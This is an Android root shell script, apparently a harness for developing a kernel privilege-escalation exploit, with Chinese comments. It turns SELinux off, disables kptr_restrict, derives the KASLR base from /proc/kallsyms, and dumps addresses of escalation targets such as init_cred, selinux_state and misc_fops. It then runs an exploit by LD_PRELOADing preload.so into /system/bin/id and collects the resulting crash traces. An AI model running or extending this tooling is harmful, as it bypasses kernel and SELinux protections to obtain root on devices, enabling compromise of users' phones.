#!/system/bin/sh
# violin-crash-diag.sh — root 设备上复现 crash 并采集 call trace
# 用法: su -c "sh <脚本目录>/violin-crash-diag.sh"

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
KREAD="$SCRIPT_DIR/kcore_read"
PRELOAD="$SCRIPT_DIR/preload.so"

log() { echo "$@"; echo "$@" >> "$SCRIPT_DIR/diag.txt"; }

log "=== violin-crash-diag $(date) ==="
log "boot_id: $(cat /proc/sys/kernel/random/boot_id)"
log "selinux: $(getenforce)"
log ""

# 1. 临时提权
setenforce 0 2>/dev/null && log "selinux -> permissive"
echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null && log "kptr_restrict -> 0"
log ""

# 2. 确保 preload.so 在 /data/local/tmp/
if [ ! -f /data/local/tmp/preload.so ] || [ ! -s /data/local/tmp/preload.so ]; then
    cp "$PRELOAD" /data/local/tmp/preload.so
    chmod 755 /data/local/tmp/preload.so
    log "copied preload.so -> /data/local/tmp/"
fi
# 验证文件有效
if file /data/local/tmp/preload.so 2>/dev/null | grep -q "ELF"; then
    log "preload.so: valid ELF"
else
    log "ERROR: preload.so 无效! 请手动复制:"
    log "  cp $PRELOAD /data/local/tmp/preload.so"
    log "  chmod 755 /data/local/tmp/preload.so"
fi

# 3. 计算 KASLR base (从 kallsyms 的 worker_thread 偏移)
WORKER_ADDR=$(grep -w "worker_thread" /proc/kallsyms | head -1 | awk '{print $1}')
if [ -n "$WORKER_ADDR" ]; then
    # worker_thread 在 _text + 0xd78e0
    # _text = worker_thread - 0xd78e0
    WORKER_DEC=$((16#$WORKER_ADDR))
    TEXT_DEC=$((WORKER_DEC - 0xd78e0))
    KASLR_BASE=$(printf "0x%016x" $TEXT_DEC)
    log "worker_thread = 0x$WORKER_ADDR"
    log "_text = $KASLR_BASE"
else
    KASLR_BASE="0"
    log "WARNING: worker_thread not found, using KASLR_BASE=0"
fi
log ""

# 4. 关键符号
log "=== KEY SYMBOLS ==="
for sym in _text do_select rt_mutex_adjust_prio_chain rb_erase \
           __rb_erase_color rt_mutex_setprio task_blocks_on_rt_mutex \
           __sched_setscheduler selinux_enforcing_boot selinux_state \
           init_cred init_task misc_fops ashmem_fops \
           configfs_read_iter configfs_bin_write_iter fair_sched_class \
           anon_pipe_buf_ops sysctl_bootid worker_thread; do
    line=$(grep -w "$sym" /proc/kallsyms | head -1)
    [ -n "$line" ] && log "  $line"
done
log ""

# 5. 内核配置
log "=== KERNEL CONFIG ==="
zcat /proc/config.gz 2>/dev/null | grep -E "UBSAN|CFI|PANIC|DEBUG_SPINLOCK|LOCKDEP|SHADOW_CALL" | while read l; do log "  $l"; done
log ""

# 6. 保存 dmesg 基线
log "=== DMESG BASELINE ==="
dmesg | tail -5 >> "$SCRIPT_DIR/diag.txt"
log ""

# 7. 清空 dmesg
dmesg -c > /dev/null 2>&1

# 8. 后台 dmesg 捕获
dmesg -w > "$SCRIPT_DIR/dmesg_live.txt" 2>/dev/null &
DMESG_PID=$!

# 9. 运行 exploit
log "=== RUNNING EXPLOIT ==="
log "CFI_KASLR_BASE=$KASLR_BASE"
log ""
CFI_KASLR_BASE="$KASLR_BASE" LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id > "$SCRIPT_DIR/exploit_output.txt" 2>&1
EXPLOIT_EXIT=$?

sleep 2
kill $DMESG_PID 2>/dev/null

# 10. 采集 dmesg
log "=== DMESG AFTER EXPLOIT ==="
dmesg >> "$SCRIPT_DIR/diag.txt" 2>/dev/null

# 11. 提取 crash trace
log ""
log "=== CRASH CALL TRACE ==="
grep -B 2 -A 30 "Unable to handle\|Call trace\|kernel BUG\|ubsan\|BRK\|rt_mutex\|rb_erase\|panic\|Oops" "$SCRIPT_DIR/diag.txt" >> "$SCRIPT_DIR/crash_trace.txt" 2>/dev/null

# 12. 恢复
rm -f /data/local/tmp/preload.so 2>/dev/null
setenforce 1 2>/dev/null && log "selinux -> enforcing"
echo 1 > /proc/sys/kernel/kptr_restrict 2>/dev/null

log ""
log "=== DONE ==="
log "exit=$EXPLOIT_EXIT kaslr=$KASLR_BASE"
